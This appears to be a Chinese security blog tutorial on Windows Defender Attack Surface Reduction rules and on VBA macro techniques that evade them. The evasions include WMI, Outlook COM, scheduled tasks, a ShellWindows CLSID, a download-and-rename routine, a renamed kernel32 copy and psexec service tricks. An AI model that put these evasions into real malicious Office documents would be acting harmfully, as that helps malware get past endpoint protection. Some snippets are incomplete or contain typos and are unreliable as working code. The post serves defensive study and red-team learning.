原创lengyi合天智汇

## 前言  

在去年的off大会上安全研究员sevagas做了关于宏绕过ASR的相关议题，本人对此很感兴趣，在此记录一下自己的学习过程。

## 什么是ASR  

ASR是Attack surface reduction的简称，内置与win10的1709版本之后和server2016的版本中，微软官方给出的解释是：

    
    
    “Attack surface reduction is a feature that helps prevent actions and apps that are typically used by
    exploit-seeking malware to infect machines.”

大体意思就是通过配置攻击面减少规则，可以保护计算机不被恶意软件、代码攻击。它主要可以防护下面几个方面：

  * Malicious Office document  

  * Rogue USB device  

  * Drive by download  

  * Malicious APK in store  

### 配置ASR  

我们可以在运行中输入gpedit.msc打开组策略编辑器，然后在组策略管理编辑器中, 转到 "计算机配置", 然后单击 "管理模板"，然后以此选择：

    
    
    Windows 组件 > Windows Defender 防病毒 > Windows Defender 攻击防护 > 攻击面减少

即可看到我们的ASR管理页面。

![v2-208374249fdb0e27f2cfdda4a8b13a9b_720w](https://pic2.zhimg.com/80/v2-208374249fdb0e27f2cfdda4a8b13a9b_720w.png)

ASR规则，有下面三种模式,分别是：

  * 未配置：禁用 ASR 规则  

  * 阻止：启用 ASR 规则  

  * 审核：评估 ASR 规则对您的组织的影响（如果已启用）  

分别对应数字0、1、2

我们可以使用下面的powershell命令来设置对应的规则：

    
    
    Add-MpPreference -AttackSurfaceReductionOnlyExclusions "<fully qualified path or resource>"

也可以使用界面化的操作。ASR的规则使用GUID来标识相关信息，GUID如下：

![v2-1e65b9c8126436cd3719a03ddb6f97d9_720w](https://pic4.zhimg.com/80/v2-1e65b9c8126436cd3719a03ddb6f97d9_720w.png)

配置完的ASR规则，可以在下面的注册表中找到：

    
    
    • Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Group Policy
    Objects\{5B492C3C-4EAB-494D-B7DDF0FB0FD3A17D}Machine\Software\Policies\Microsoft\Windows Defender\Windows
    Defender Exploit Guard\ASR\Rules
    • HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit
    Guard\ASR\Rules\d1e49aac-8f56-4280-b9ba-993a6d77406c
    • \HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Group Policy
    Objects\{9CC79454-DCDF-422D-A24C81990D96B449}Machine\Software\Policies\Microsoft\Windows Defender\Windows
    Defender Exploit Guard\ASR\Rules

配置完之后，在事件管理器中导入以下xml文件：

    
    
    <QueryList>
      <Query Id="0" Path="Microsoft-Windows-Windows Defender/Operational">
       <Select Path="Microsoft-Windows-Windows Defender/Operational">*[System[(EventID=1121 or EventID=1122 or EventID=5007)]]</Select>
       <Select Path="Microsoft-Windows-Windows Defender/WHC">*[System[(EventID=1121 or EventID=1122 or EventID=5007)]]</Select>
      </Query>
    </QueryList>

即可在时间查看器内看到我们ASR的响应事件。

![v2-9de02da83a05b95e46cfcf42d836cc99_720w](https://pic3.zhimg.com/80/v2-9de02da83a05b95e46cfcf42d836cc99_720w.png)

## bypassASR  

### 基础绕过  

我们先导入以下ASR规则：

    
    
    D4F940AB-401B-4EFC-AADC-AD5F3C50688A
    26190899-1602-49e8-8b27-eb1d0a1ce869 
    d1e49aac-8f56-4280-b9ba-993a6d77406c

我们以下面的这个宏代码为例：

    
    
    Sub WscriptExec(targetPath As String)
        CreateObject("WScript.Shell").Run targetPath,0
    End Sub

当我们运行这个宏的时候，就会被ASR规则所拦截

![v2-c87cbbb3d32e533a257b0cebec4b7060_720w](https://pic4.zhimg.com/80/v2-c87cbbb3d32e533a257b0cebec4b7060_720w.png)

拦截的规则为：

    
    
    D4F940AB-401B-4EFC-AADC-AD5F3C50688A

因为我们调用了WScript.Shell这个对象来运行一个程序，所以导致被拦截了，但是，宏中不只这一种方法调用外部程序，我们还可以使用wmi对象，代码如下：

    
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
        WmiExec = objProcess.Create(targetPath,Null,objConfig,intProcessID)

此时我们再运行宏，我们的拦截规则已经变成了d1e49aac-8f56-4280-b9ba-993a6d77406c
说明D4F940AB-401B-4EFC-AADC-AD5F3C50688A规则我们已经绕过了。

![v2-7d001535320a3928447456ff98b9ad72_720w](https://pic1.zhimg.com/80/v2-7d001535320a3928447456ff98b9ad72_720w.png)

没关系，除了wmi，我们还可以使用outlook对象进行调用，代码如下：

    
    
    Set outlookApp = CreateObject("Outlook.Application")
    outlookApp.CreateObject("Wscript.shell").Run "calc.exe",0

此时我们再运行宏，我们的拦截规则已经变成了26190899-1602-49e8-8b27-eb1d0a1ce869
说明d1e49aac-8f56-4280-b9ba-993a6d77406c规则已经被绕过了。

![v2-29c13502519db015b0f8fbd78ecb4969_720w](https://pic2.zhimg.com/80/v2-29c13502519db015b0f8fbd78ecb4969_720w.png)

那么，怎么全部绕过呢？我们还可以使用计划任务，在宏里面提供了Schedule.Service对象，它允许我们创建一个计划任务出来，代码如下：

    
    
    Set service = CreateObject("Schedule.Service")
    Dim Action
    Set Action = taskDefinition.Actions.Create(ActionTypeExec)
    Action.Path = Split("cmd.exe"," ")(0)
    Action.HideAppWindow = True
    
    Call rootFolder.RegisterTaskDefinition("System Timer T",taskDefinition,6,,,3)
    Application.Wait Now + TimeValue("0:00:01")
    
    Call rootFolder.DeleteTask("System Timer T",0)

执行宏ASR无反应，此时上面的三个规则已被我们绕过。

上面我们调用com对象的方法都是使用CreateObject, ShellExecute等
除了上面的几个方法之外我们也可以用com的CLSID进行操作。clsid是微软标识COM类对象的全局唯一标识符。如果服务器或容器允许链接到其嵌入式对象，则需要为每种受支持的对象类注册一个CLSID。默认在

    
    
    HKEY_LOCAL_MACHINE \ SOFTWARE \ Classes \ CLSID \

里面，所以也就是说我们使用clsid的前提也是这个clsid已经在系统中注册了，而且因为clsid的特性（可执行相应程序操作），所以我们可以用来来bypassASR：

    
    
    Const ShellWindows = _
        "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
        Set SW = GetObject("new:" & ShellWindows).Item()
        SW.Document.Application.ShellExecute "calc.exe", Null, "C:\Windows\System32", Null, 0

![v2-6b049c151aba4c720175be9719f20edc_720w](https://pic2.zhimg.com/80/v2-6b049c151aba4c720175be9719f20edc_720w.png)

### 其他ASR绕过  

    
    
    3B576869-A4EC-4529-8536-B80A7769E899

这个规则是拦截宏在文件系统中保存和执行文件的规则。比如关键字“saveas”

绕过也比较简单：

    
    
    ub Download(myurl As String , realPath As String)
    
    Dim downloadPath As String
    
    downloadPath = Environ("TEMP") & "\\" & "acqeolw.txt"
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    WinHttpReq.Send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.SaveToFile downloadPath, 2
        oStream.Close
        renameCmd = "C:\windows\system32\cmd.exe /C move" & downloadPath & " " & realPath
        RDS_DataSpaceExec renameCmd
        Application.Wait Now + TimeValue("0:00:01")
    End If
    
    End Sub

大体思路就是改变关键字，敏感文件更名。

    
    
    92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B

这个规则防止程序对win32的调用：

比如下面的代码：

    
    
    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
    
    Sub Workbook_Open()
        Sleep 2000
        WscriptExec "notepad.exe"
    End Sub
    
    Sub WscriptExec(targetPath As String)
        CreateObject("WScript.Shell").Run targetPath ,1
    End Sub

![v2-f331f77d6bf58932d65d3f07f0146a52_720w](https://pic4.zhimg.com/80/v2-f331f77d6bf58932d65d3f07f0146a52_720w.png)

绕过方法跟上面类似，更名、该位置：

    
    
    Private Declare PtrSafe Sub Sleep Lib "k32.dll" (ByVal dwMilliseconds As Long)
    
    Sub Workbook_Open()
        WscriptExec("cmd.exe /C copy /b C:\windows\system32\kernel32.dll " & Environ("TEMP") & "\k32.dll")
        CreateObject("WScript.Shell").currentdirectory = Environ("TEMP")
        Sleep 2000
        WscriptExec "notepad.exe"
    End Sub
    
    Sub WscriptExec(targetPath As String)
        CreateObject("WScript.Shell").Run targetPath ,1
    End Sub
    D3E037E1-3EB8-44C8-A917-57927947596D

这个是拦截vb或者js执行下面的内容的规则：

![v2-5deef9cebe6c0a78ec821b47d302de61_720w](https://pic2.zhimg.com/80/v2-5deef9cebe6c0a78ec821b47d302de61_720w.png)

不过这个规则有一些问题，总是被asmi拦截，绕过方法如下图：

![v2-9126a250f4ace7896b74b99b068edd3d_720w](https://pic1.zhimg.com/80/v2-9126a250f4ace7896b74b99b068edd3d_720w.png)

或者：

    
    
    move  file_path  %temp%\tmpfile.dat 
    type %temp%\tmpfile.dat > file_path 
    del %temp%\tmpfile.dat
    d1e49aac-8f56-4280-b9ba-993a6d77406c

这个是拦截wmi和psexec调用的规则：

不过貌似也有一些问题：

    
    
    psexec.exe -i cmd.exe -> Not blocked
    psexec -s -i cmd.exe -> blocked

好像只拦截服务。

绕过方法：

    
    
    PSEXESVC.exe –install -> PsInfo Service installed.
    sc start PSINFSVC
    psexec -s -i cmd.exe

![v2-18d66799e0b5159c7443e1c23cb2c3dd_720w](https://pic3.zhimg.com/80/v2-18d66799e0b5159c7443e1c23cb2c3dd_720w.png)

## 后话  

bypass之路自然不止这些，向UAC、ASMI等的绕过，路还有很长。

参考文章：

<https://docs.microsoft.com/zh-cn/windows/win32/com/clsid-key-hklm>

<https://blog.csdn.net/dvvnv/article/details/98471195>

<https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/enable-attack-surface-reduction>

<https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction>

<https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/evaluate-attack-surface-reduction>

[https://www.*******.com/watch?v=YMHsuu3qldE&t=1102s](https://www.*******.com/watch?v=YMHsuu3qldE&t=1102s)

<https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/event-views>

<https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction>

<https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office>

<https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule>

<https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/exploit-protection#review-attack-surface-reduction-events-in-windows-event-viewer>

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

